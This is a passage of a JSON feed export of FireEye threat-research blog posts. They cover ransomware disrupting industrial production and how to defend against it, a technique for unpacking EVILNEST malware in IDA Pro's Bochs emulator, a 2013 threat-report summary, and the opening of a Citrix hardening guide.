Brubaker","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/otransomware/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn52@2020_1/2020/08/24/14-11-05-351_7ac2173db94e4060.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/otransomware/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn51@2020_6/2020/08/24/14-11-11-544_23478c8bbac9b3d7.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/otransomware/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn27@2020_6/2020/08/24/14-11-12-059_0366dbf0cbb78028.webp"},"publishedOrCreatedDate":1598278264223},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Ransomware Against the Machine: How Adversaries are Learning to Disrupt\nIndustrial Production by Targeting IT and OT","link":"http://www.fireeye.com/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html","description":"<p>Since at least 2017, there has been a significant increase in public disclosures of ransomware incidents impacting industrial production and critical infrastructure organizations. Well-known ransomware families like WannaCry, LockerGoga, MegaCortex, Ryuk, Maze, and now SNAKEHOSE (a.k.a. Snake / Ekans), have cost victims across a variety of industry verticals many millions of dollars in ransom and collateral costs. These incidents have also resulted in significant disruptions and delays to the physical processes that enable organizations to produce and deliver goods and services.</p> \n<p>While lots of information has been shared about the victims and immediate impacts of industrial sector ransomware distribution operations, the public discourse continues to miss the big picture. As financial crime actors have evolved their tactics from opportunistic to post-compromise ransomware deployment, we have observed an increase in adversaries’ internal reconnaissance that enables them to target systems that are vital to support the chain of production. As a result, ransomware infections—either affecting critical assets in corporate networks or reaching computers in OT networks—often result in the same outcome: insufficient or late supply of end products or services.</p> \n<p>Truly understanding the unique nuances of industrial sector ransomware distribution operations requires a combination of skillsets and visibility across both IT and OT systems. Using examples derived from our consulting engagements and threat research, we will explain how the shift to post-compromise ransomware operations is fueling adversaries’ ability to disrupt industrial operations.</p> \n<h4>Industrial Sector Ransomware Distribution Poses Increasing Risk as Actors Move to Post-Compromise Deployment</h4> \n<p>The traditional approach to ransomware attacks predominantly relies on a “shotgun” methodology that consists of indiscriminate campaigns spreading malware to encrypt files and data from a variety of victims. Actors following this model will extort victims for an average of $500 to $1,000 USD and hope to receive payments from as many individuals as possible. While early ransomware campaigns adopting this approach were often considered out of scope for OT security, recent campaigns targeting entire industrial and critical infrastructure organizations have moved toward adopting a more operationally complex post-compromise approach.</p> \n<p>In post-compromise ransomware incidents, a threat actor may still often rely on broadly distributed malware to obtain their initial access to a victim environment, but once on a network they will focus on gaining privileged access so they can explore the target networks and identify critical systems before deploying the ransomware. This approach also makes it possible for the attacker to disable security processes that would normally be enough to detect known ransomware indicators or behaviors. Actors cast wider nets that may impact critical systems, which &nbsp;expand the scale and effectiveness of their end-stage operations by inflicting maximum pain on the victim. As a result, they are better positioned to negotiate and can often demand much higher ransoms—which are commonly commensurate with the victims’ perceived ability to pay and the value of the ransomed assets themselves. For more information, including technical detail, on similar activity, see our recent blog posts on <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\">FIN6</a> and <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html\">TEMP.MixMaster</a>.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/icsransomware/Picture1.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: Comparison of indiscriminate vs. post-compromise ransomware approaches</span></p> \n<p>Historical incidents involving the opportunistic deployment of ransomware have often been limited to impacting individual computers, which occasionally included OT intermediary systems that were either internet-accessible, poorly segmented, or exposed to infected portable media. In 2017, we also observed campaigns such as NotPetya and BadRabbit, where wiper malware with worm-like capabilities were released to disrupt organizations while masquerading as ransomware. While these types of campaigns pose a threat to industrial production, the adoption of post-compromise deployment presents three major twists in the plot.</p> \n<ul> \n <li>As threat actors tailor their attacks to target specific industries or organizations, companies with high-availability requirements (e.g., public utilities, hospitals, and industrial manufacturing) and perceived abilities to pay ransoms (e.g., higher revenue companies) become prime targets. This represents an expansion of financial crime actors’ targeting of industries that process directly marketable information (e.g., credit card numbers or customer data) to include the monetization of production environments.</li> \n <li>As threat actors perform internal reconnaissance and move laterally across target networks before deploying ransomware, they are now better positioned to cast wide nets that impact the target’s most critical assets and negotiate from a privileged position.</li> \n <li>Most importantly, many of the tactics, techniques, and procedures (TTPs) often used by financial actors in the past, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/12/fireeye-approach-to-operational-technology-security.html\">resemble those employed by high-skilled actors</a> across the initial and middle stages of the attack lifecycle of past OT security incidents. Therefore, financial crime actors are likely capable of pivoting to and deploying ransomware in OT intermediary systems to further disrupt operations.</li> \n</ul> \n<h4>Organized Financial Crime Actors Have Demonstrated an Ability to Disrupt OT Assets</h4> \n<p>An actor’s capability to obtain financial benefits from post-compromise ransomware deployment depends on many factors, one of which is the ability to disrupt systems that are the most relevant to the core mission of the victim organizations. As a result, we can expect mature actors to gradually broaden their selection from only IT and business processes, to also OT assets monitoring and controlling physical processes. This is apparent in ransomware families such as SNAKEHOSE, which was designed to execute its payload only after stopping a series of processes that included some industrial software from vendors such as General Electric and Honeywell. At first glance, the SNAKEHOSE kill list appeared&nbsp;to be specifically tailored to OT environments due to the relatively small number of processes (yet high number of OT-related processes) identified with automated tools for initial triage. However, after manually extracting the list&nbsp;from the function that was terminating the processes, we determined that the kill list utilized by SNAKEHOSE actually targets over 1,000 processes.</p> \n<p>In fact, we have observed very similar process kill lists deployed alongside samples from other ransomware families, including LockerGoga, MegaCortex, and Maze. Not surprisingly, all of these code families have been associated with high-profile incidents impacting industrial organizations for the past two years. The earliest kill list containing OT processes we identified was a batch script deployed alongside LockerGoga in January 2019. The list is very similar to those used later in MegaCortex incidents, albeit with notable exceptions, such as an apparent typo on an OT-related process that is not present in our SNAKEHOSE or MegaCortex samples: “proficyclient.exe4”. The absence of this typo in the SNAKEHOSE and MegaCortex samples could indicate that one of these malware authors identified and corrected the error when initially copying the OT-processes from the LockerGoga list, or that the LockerGoga author failed to properly incorporate the processes from some theoretical common source of origin, such as a dark web post.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/icsransomware/Picture2.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 2: ‘proficyclient.exe’ spelling in kill lists deployed with LockerGoga (left) and SNAKEHOSE (right)</span></p> \n<p>Regardless of which ransomware family first employed the OT-related processes in a kill list or where the malware authors acquired the list, the seeming ubiquity of this list across malware families suggests that the list itself is more noteworthy than any individual&nbsp;malware family&nbsp;that has implemented&nbsp;it. While the OT processes identified in these lists may simply represent the coincidental output of automated process collection from target environments and not a targeted effort to impact OT, the existence of this list provides financial crime actors opportunities to disrupt OT systems. Furthermore, we expect that as financially motivated threat actors continue to impact industrial sector organizations, become more familiar with OT, and identify dependencies across IT and OT systems, they will develop capabilities—and potentially intent—to disrupt other systems and environments running industrial software products and technology.</p> \n<h4>Ransomware Deployments in Both IT and OT Systems Have Impacted Industrial Production</h4> \n<p>As a result of adversaries’ post-compromise strategy and increased awareness of industrial sector targets, ransomware incidents have effectively impacted industrial production regardless of whether the malware was deployed in IT or OT. Ransomware incidents encrypting data from servers and computers in corporate networks have resulted in direct or indirect disruptions to physical production processes overseen by OT networks. This has caused insufficient or late supply of end products or services, representing long-term financial losses in the form of missed business opportunities, costs for incident response, regulatory fines, reputational damage, and sometimes even paid ransoms. In certain sectors, such as utilities and public services, high availability is also critical to societal well-being.</p> \n<p>The best-known example of ransomware impacting industrial production due to an IT network infection is Norsk Hydro’s incident from March 2019, where disruptions to Business Process Management Systems (BPMS) forced multiple sites to shut down automation operations. Among other collateral damage, the ransomware interrupted communication between IT systems that are commonly used to manage resources across the production chain. Interruptions to these flows of information containing for example product inventories, forced employees to identify manual alternatives to handle more than 6,500 stock-keeping units and 4,000 shelves. FireEye Mandiant has responded to at least one similar case where TrickBot was used to deploy Ryuk ransomware at an oil rig manufacturer. While the infection happened only on corporate networks, the biggest business impact was caused by disruptions of Oracle ERP software driving the company temporarily offline and negatively affecting production.</p> \n<p>Ransomware may result in similar outcomes when it reaches IT-based assets in OT networks, for example human-machine interfaces (HMIs), supervisory control and data acquisition (SCADA) software, and engineering workstations. Most of this equipment relies on commodity software and standard operating systems that are vulnerable to a variety of IT threats. Mandiant Intelligence is aware of at least one incident in which an industrial facility suffered a plant shutdown due to a large-scale ransomware attack, based on sensitive sources. The facility's network was improperly segmented, which allowed the malware to propagate from the corporate network into the OT network, where it encrypted servers, HMIs, workstations, and backups. The facility had to reach out to multiple vendors to retrieve backups, many of which were decades old, which delayed complete restoration of production.</p> \n<p>As recently as February 2020, the Cybersecurity Infrastructure and Security Agency (CISA) released Alert <a href=\"https://www.us-cert.gov/ncas/alerts/aa20-049a\">AA20-049A</a> describing how a post-compromise ransomware incident had affected control and communication assets on the OT network of a natural gas compression facility. Impacts to HMIs, data historians, and polling servers resulted in loss of availability and loss of view for human operators. This prompted an intentional shut down of operations that lasted two days.</p> \n<h4>Mitigating the Effects of Ransomware Requires Defenses Across IT and OT</h4> \n<p>Threat actors deploying ransomware have made rapid advances both in terms of effectiveness and as a criminal business model, imposing high operational costs on victims. We encourage all organizations to evaluate their safety and industrial risks related to ransomware attacks. Note that these recommendations will also help to build resilience in the face of other threats to business operations (e.g., cryptomining malware infections). While every case will differ, we highlight the following recommendations.</p> \n<p>For custom services and actionable intelligence in both IT and OT, contact FireEye <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/incident-response.html\">Mandiant Consulting</a>, <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html\">Managed Defense</a>, and <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html\">Threat Intelligence</a>.</p> \n<ul> \n <li>Conduct tabletop and/or controlled red team exercises to assess the current security posture and ability of your organization to respond to the ransomware threat. Simulate attack scenarios (mainly in non-production environments) to understand how the incident response team can (or cannot) detect, analyze, and recover from such an attack. Revisit recovery requirements based on the exercise results. In general, repeatedly practicing various threat scenarios will improve awareness and ability to respond to real incidents.</li> \n <li>Review operations, business processes, and workflows to identify assets that are critical to maintaining continuous industrial operations. Whenever possible, introduce redundancy for critical assets with low tolerance to downtime. The right amount and type of redundancy is unique for each organization and can be determined through risk assessments and cost-benefit analyses. Note that such analyses cannot be conducted without involving business process owners and collaborating across IT and OT.</li> \n <li>Logically segregate primary and redundant assets either by a network-based or host-based firewall with subsequent asset hardening (e.g., disabling services typically used by ransomware for its propagation, like SMB, RDP, and WMI). In addition to creating policies to disable unnecessary peer-to-peer and remote connections, we recommend routine auditing of all systems that potentially host these services and protocols. Note that such architecture is generally more resilient to security incidents.</li> \n <li>When establishing a rigorous back-up program, special attention should be paid to ensuring the security (integrity) of backups. Critical backups must be kept offline or, at minimum, on a segregated network.</li> \n <li>Optimize recovery plans in terms of&nbsp;recovery time objective. Introduce required alternative workflows (including manual) for the duration of recovery. This is especially critical for organizations with limited or no redundancy of critical assets. When recovering from backups, harden recovered assets and the entire organization's infrastructure to prevent recurring ransomware infection and propagation.</li> \n <li>Establish clear ownership and management of OT perimeter protection devices to ensure emergency, enterprise-wide changes are possible. Effective network segmentation must be maintained during containment and active intrusions.</li> \n <li>Hunt for adversary intrusion activity in <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/12/fireeye-approach-to-operational-technology-security.html\">intermediary systems</a>, which we define as the networked workstations and servers using standard operating systems and protocols. While the systems are further away from direct control of physical processes, there is a much higher likelihood of attacker presence.</li> \n <li>Note, that every organization is different, with unique internal architectures and processes, stakeholder needs, and customer expectations. Therefore, all recommendations should be carefully considered in the context of the individual infrastructures.&nbsp;For instance, proper network segmentation is highly advisable for mitigating the spread of ransomware. However,&nbsp;organizations with limited budgets may instead decide to leverage redundant asset diversification, host-based firewalls, and hardening as an alternative to segregating with hardware firewalls.</li> \n</ul>","descriptionType":"html","publishedDate":"Mon, 24 Feb 2020 23:30:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/icsransomware/Picture1.png","linkMd5":"51000961f0e42b6616b05ac7b80851cb","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn40@2020_5/2020/08/24/14-11-05-912_18b3fae1bdbcb728.webp","destWidth":812,"destHeight":812,"sourceBytes":241595,"destBytes":33218,"author":"Daniel Kapellmann Zafra","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/icsransomware/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn40@2020_5/2020/08/24/14-11-05-912_18b3fae1bdbcb728.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/icsransomware/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn61@2020_2/2020/08/24/14-11-09-468_b8347c99ebe5cc4e.webp"},"publishedOrCreatedDate":1598278264211},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Thinking Outside the Bochs: Code Grafting to Unpack Malware in Emulation","link":"http://www.fireeye.com/blog/threat-research/2020/04/code-grafting-to-unpack-malware-in-emulation.html","description":"<p>This blog post continues the FLARE script series with a discussion of patching IDA Pro database files (IDBs) to interactively emulate code. While the fastest way to analyze or unpack malware is often to run it, malware won’t always successfully execute in a VM. I use <a href=\"https://www.hex-rays.com/wp-content/uploads/2019/12/debugging_bochs.pdf\">IDA Pro’s Bochs integration</a> in IDB mode to sidestep tedious debugging scenarios and get quick results. Bochs emulates the opcodes directly from your IDB in a Bochs VM with no OS.</p> \n<p>Bochs IDB mode eliminates distractions like switching VMs, debugger setup, neutralizing anti-analysis measures, and navigating the program counter to the logic of interest. Alas, where there is no OS, there can be no loader or dynamic imports. Execution is constrained to opcodes found in the IDB. This precludes emulating routines that call imported string functions or memory allocators. Tom Bennett’s <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2018/12/automating-objective-c-code-analysis-with-emulation.html\">flare-emu</a> ships with emulated versions of these, but for off-the-cuff analysis (especially when I don’t know if there will be a payoff), I prefer interactively examining registers and memory to adjust my tactics ad hoc.</p> \n<p>What if I could bring my own imported functions to Bochs like flare-emu does? I’ve devised such a technique, and I call it code grafting. In this post I’ll discuss the particulars of statically linking stand-ins for common functions into an IDB to get more mileage out of Bochs. I’ll demonstrate using this on an EVILNEST sample to unpack and dump next-stage payloads from emulated memory. I’ll also show how I copied a tricky call sequence from one IDB to another IDB so I could keep the unpacking process all in a single Bochs debug session.</p> \n<h4>EVILNEST Scenario</h4> \n<p>My sample (MD5 hash <span class=\"code\">37F7F1F691D42DCAD6AE740E6D9CAB63</span> which is available on <a href=\"https://www.virustotal.com/gui/file/dda11fe201d188ea32020cda0eac130651bb0ff1f8991c2f73820d8a0b9e6242/details\">VirusTotal</a>) was an EVILNEST variant that populates the stack with configuration data before calling an intermediate payload. Figure 1 shows this unusual call site.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture1.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: Call site for intermediate payload</span></p> \n<p>The code in Figure 1 executes in a remote thread within a hollowed-out <span class=\"code\">iexplore.exe</span> process; the malware uses anti-analysis tactics as well. I had the intermediate payload stage and wanted to unpack next-stage payloads without managing a multi-process debugging scenario with anti-analysis. I knew I could stub out a few function calls in the malware to run all of the relevant logic in Bochs. Here’s how I did it.</p> \n<h4>Code Carving</h4> \n<p>I needed opcodes for a few common functions to inject into my IDBs and emulate in Bochs. I built simple C implementations of selected functions and compiled them into one binary. Figure 2 shows some of these stand-ins.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture2a.png\" alt=\"\" /> <span class=\"type-XS\"> <br /> Figure 2: Simple implementations of common functions</span></p> \n<p>I compiled this and then used IDAPython code similar to Figure 3 to extract the function opcode bytes.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture3.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 3: Function extraction</span></p> \n<p>I curated a library of function opcodes in an IDAPython script as shown in Figure 4. The nonstandard function opcodes at the bottom of the figure were hand-assembled as tersely as possible to generically return specific values and manipulate the stack (or not) in conformance with calling conventions.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture4.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 4: Extracted function opcodes</span></p> \n<p>On top of simple functions like <span class=\"code\">memcpy</span>, I implemented a memory allocator. The allocator referenced global state data, meaning I couldn’t just inject it into an IDB and expect it to work. I read the disassembly to find references to global operands and templatize them for use with Python’s <span class=\"code\">format</span> method. Figure 5 shows an example for <span class=\"code\">malloc</span>.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture5.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 5: HeapAlloc template code</span></p> \n<p>I organized the stubs by name as shown in Figure 6 both to call out functions I would need to patch, and to conveniently add more function stubs as I encounter use cases for them. The mangled name I specified as an alias for <span class=\"code\">free</span> is <span class=\"code\">operator delete</span>.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture6.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 6: Function stubs and associated names</span></p> \n<p>To inject these functions into the binary, I wrote code to find the next available segment of a given size. I avoided occupying low memory because Bochs places its loader segment below <span class=\"code\">0x10000</span>. Adjacent to the code in my code&nbsp; segment, I included space for the data used by my memory allocator. Figure 7 shows the result of patching these functions and data into the IDB and naming each location (stub functions are prefixed with <span class=\"code\">stub_</span>).</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture7.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 7: Data and code injected into IDB</span></p> \n<p>The script then iterates all the relevant calls in the binary and patches them with calls to their stub implementations in the newly added segment. As shown in Figure 8, IDAPython’s <span class=\"code\">Assemble</span> function saved the effort of calculating the offset for the <span class=\"code\">call</span> operand manually. Note that the <span class=\"code\">Assemble</span> function worked well here, but for bigger tasks, <a href=\"https://twitter.com/mykill/status/1166797442311962626\">Hex-Rays recommends a dedicated assembler</a> such as <a href=\"http://www.keystone-engine.org/\">Keystone Engine</a> and its <a href=\"http://www.keystone-engine.org/keypatch/\">Keypatch</a> plugin for IDA Pro.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture8.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 8: Abbreviated routine for assembling a call instruction and patching a call site to an import</span></p> \n<p>The Code Grafting script updated all the relevant call sites to resemble Figure 9, with the target functions being replaced by calls to the <span class=\"code\">stub_</span> implementations injected earlier. This prevented Bochs in IDB mode from getting derailed when hitting these call sites, because the call operands now pointed to valid code inside the IDB.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture9.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 9: Patched operator new() call site</span></p> \n<h4>Dealing with EVILNEST</h4> \n<p>The debug scenario for the dropper was slightly inconvenient, and simultaneously, it was setting up a very unusual call site for the payload entry point. I used Bochs to execute the dropper until it placed the configuration data on the stack, and then I used IDAPython’s <span class=\"code\">idc.get_bytes</span> function to extract the resulting stack data. I wrote IDAPython script code to iterate the stack data and assemble push instructions into the payload IDB leading up to a call instruction pointing to the DLL’s export. This allowed me to debug the unpacking process from Bochs within a single session.</p> \n<p>I clicked on the beginning of my synthesized call site and hit F4 to run it in Bochs. I was greeted with the warning in Figure 10 indicating that the patched IDB would not match the depictions made by the debugger (which is untrue in the case of Bochs IDB mode). Bochs faithfully executed my injected opcodes producing exactly the desired result.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture10.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 10: Patch warning</span></p> \n<p>I watched carefully as the instruction pointer approached and passed the <span class=\"code\">IsDebuggerPresent</span> check. Because of the stub I injected (<span class=\"code\">stub_IsDebuggerPresent</span>), it passed the check returning zero as shown in Figure 11.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture11.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 11: Passing up IsDebuggerPresent</span></p> \n<p>I allowed the program counter to advance to address <span class=\"code\">0x1A1538</span>, just beyond the unpacking routine. Figure 12 shows the register state at this point which reflects a value in <span class=\"code\">EAX</span> that was handed out by my fake heap allocator and which I was about to visit.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture12.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 12: Running to the end of the unpacker and preparing to view the result</span></p> \n<p>Figure 13 shows that there was indeed an <span class=\"code\">IMAGE_DOS_SIGNATURE</span> (“MZ”) at this location. I used <span class=\"code\">idc.get_bytes()</span> to dump the unpacked binary from the fake heap location and saved it for analysis.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture13.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 13: Dumping the unpacked binary</span></p> \n<p>Through Bochs IDB mode, I was also able to use the interactive debugger interface of IDA Pro to experiment with manipulating execution and traversing a different branch to unpack another payload for this malware as well.</p> \n<h4>Conclusion</h4> \n<p>Although dynamic analysis is sometimes the fastest road, setting it up and navigating minutia detract from my focus, so I’ve developed an eye for routines that I can likely emulate in Bochs to dodge those distractions while still getting answers. Injecting code into an IDB broadens the set of functions that I can do this with, letting me get more out of Bochs. This in turn lets me do more on-the-fly experimentation, one-off string decodes, or validation of hypotheses before attacking something at scale. It also allows me to experiment dynamically with samples that won’t load correctly anyway, such as unpacked code with damaged or incorrect PE headers.</p> \n<p>I’ve shared the Code Grafting tools as part of the <a href=\"https://github.com/fireeye/flare-ida/\">flare-ida GitHub repository</a>. To use this for your own analyses:</p> \n<ol> \n <li>In IDA Pro’s IDAPython prompt, run <span class=\"code\">code_grafter.py</span> or import it as a module.</li> \n <li>Instantiate a <span class=\"code\">CodeGrafter</span> object and invoke its <span class=\"code\">graftCodeToIdb()</span> method:\n  <ul> \n   <li> <span class=\"code\">CodeGrafter().graftCodeToIdb()</span></li> \n  </ul> </li> \n <li>Use Bochs in IDB mode to conveniently execute your modified sample and experiment away!</li> \n</ol> \n<p>This post makes it clear just how far I’ll go to avoid breaking eye contact with IDA. If you’re a fan of using Bochs with IDA too, then this is my gift to you. Enjoy!</p>","descriptionType":"html","publishedDate":"Tue, 07 Apr 2020 16:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture1.png","linkMd5":"6e300db7afe3b0d6d31a9de593949d0c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn44@2020_6/2020/08/24/14-11-04-908_17e870d9176e4ac3.webp","destWidth":864,"destHeight":358,"sourceBytes":110279,"destBytes":37964,"author":"Michael Bailey","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn44@2020_6/2020/08/24/14-11-04-908_17e870d9176e4ac3.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture2a.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn72@2020_1/2020/08/24/14-11-17-275_014a1eebd3ccaa91.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn5@2020_1/2020/08/24/14-11-16-901_10443b23145564e5.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture4.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn60@2020_3/2020/08/24/14-11-18-155_e12bd49a9fb0d6e7.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture5.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn19@2020_3/2020/08/24/14-11-18-612_37a5a3ac47e49bde.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture6.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn3@2020_4/2020/08/24/14-11-19-434_0c083a4924f1bec3.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture7.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn23@2020_5/2020/08/24/14-11-21-174_14f0f977e6bf7908.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture8.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn67@2020_1/2020/08/24/14-11-08-857_9a26da78fe1a5241.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture9.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn12@2020_6/2020/08/24/14-11-09-096_6a0414c217bd22b1.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture10.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn35@2020_1/2020/08/24/14-11-18-901_88fe2f6dd354d421.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture11.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn12@2020_3/2020/08/24/14-11-20-838_0c4c0d92427940cc.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture12.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn81@2020_5/2020/08/24/14-11-21-114_227c7880398de56e.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/bochs/Picture13.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn52@2020_2/2020/08/24/14-11-09-753_a2c85d5172c01cf6.webp"},"publishedOrCreatedDate":1598278264184},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"The 2013 FireEye Advanced Threat Report!","link":"http://www.fireeye.com/blog/threat-research/2014/02/the-2013-fireeye-advanced-threat-report.html","description":"<p>FireEye has just released its 2013 Advanced Threat Report (ATR), which provides a high-level overview of the computer network attacks that FireEye discovered last year.</p> \n<p>In this ATR, we focused almost exclusively on a small, but very important subset of our overall data analysis – the advanced persistent threat (APT).</p> \n<p>APTs, due to their organizational structure, mission focus, and likely some level of nation-state support, often pose a more serious danger to enterprises than a lone hacker or hacker group ever could.</p> \n<p>Over the long term, APTs are capable of cyber attacks that can rise to a strategic level, including widespread&nbsp;intellectual property theft, espionage, and attacks on national critical infrastructures.</p> \n<p>The data contained in this report is gleaned from the <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/mandiant/threat-intelligence.html\">FireEye Dynamic Threat Intelligence (DTI) cloud</a>, and is based on attack metrics shared by FireEye customers around the world.</p> \n<p>Its insight is derived from:</p> \n<ul> \n <li>39,504 cyber security incidents</li> \n <li>17,995 malware infections</li> \n <li>4,192 APT incidents</li> \n <li>22 million command and control (CnC) communications</li> \n <li>159 APT-associated malware families</li> \n <li>CnC infrastructure in 206 countries and territories</li> \n</ul> \n<p> <a href=\"http://www.fireeye.com/content/dam/legacy/blog/2014/02/FireEye-2013-Threat-Report-Final.png\"><img class=\"alignnone size-full wp-image-4780 portrait-med\" alt=\"FireEye 2013 Threat Report Final\" src=\"https://www.fireeye.com/content/dam/legacy/blog/2014/02/FireEye-2013-Threat-Report-Final.png\" width=\"680\" height=\"2989\" /></a></p> \n<p>Based on our data, the U.S., South Korea, and Canada were the top APT targets in 2013; the U.S., Canada, and Germany were targeted by the highest number of unique malware families.</p> \n<p>The ATR describes attacks on 20+ industry verticals. Education, Finance, and High-Tech were the top overall targets, while Government, Services/Consulting, and High-Tech were targeted by the highest number of unique malware families.</p> \n<p>In 2013, FireEye discovered eleven zero-day attacks. In the first half of the year, Java was the most common target for zero-days; in the second half, FireEye observed a surge in Internet Explorer (IE) zero-days that were used in watering hole attacks, including against U.S. government websites.</p> \n<p>Last year, FireEye analyzed five times more Web-based security alerts than email-based alerts – possibly stemming from an increased awareness of spear phishing as well as a more widespread use of social media.</p> \n<p>In sum, the 2013 ATR offers strong evidence that malware infections occur within enterprises at an alarming rate, that attacker infrastructure is global in scope, and that advanced attackers continue to penetrate legacy defenses, such as firewalls and anti-virus (AV), with ease.</p>","descriptionType":"html","publishedDate":"Thu, 27 Feb 2014 14:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/blog/2014/02/FireEye-2013-Threat-Report-Final.png","linkMd5":"faa95d4bb9be5ca1e3eb5c8f139ba96e","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn15@2020_4/2020/08/24/14-11-04-964_a61ea7ed8567eab7.webp","destWidth":680,"destHeight":2989,"sourceBytes":336786,"destBytes":119680,"author":"Kenneth Geers","articleImgCdnMap":{"https://www.fireeye.com/content/dam/legacy/blog/2014/02/FireEye-2013-Threat-Report-Final.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn15@2020_4/2020/08/24/14-11-04-964_a61ea7ed8567eab7.webp"},"publishedOrCreatedDate":1598278264204},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Citrix XenApp and XenDesktop Hardening Guidance","link":"http://www.fireeye.com/blog/threat-research/2016/03/citrix_xenapp_andxe.html","description":"<h5>A Joint Whitepaper from Mandiant and Citrix</h5> \n<p>Throughout the course of <a 